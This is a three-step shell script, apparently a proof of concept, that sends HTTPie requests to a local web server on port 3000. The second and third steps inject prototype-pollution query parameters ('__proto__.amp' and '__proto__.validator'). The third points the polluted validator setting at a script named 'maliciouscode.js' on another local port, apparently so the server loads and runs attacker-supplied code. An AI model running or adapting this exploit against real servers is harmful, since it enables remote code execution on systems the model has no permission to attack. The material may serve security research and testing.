echo "step 1"
http --quiet http://localhost:3000/

echo "step 2"
http --quiet http://localhost:3000\?__proto__.amp=1

echo "step 3"
http --quiet --timeout=5 http://localhost:3000\?__proto__.validator\=http://localhost:8080/maliciouscode.js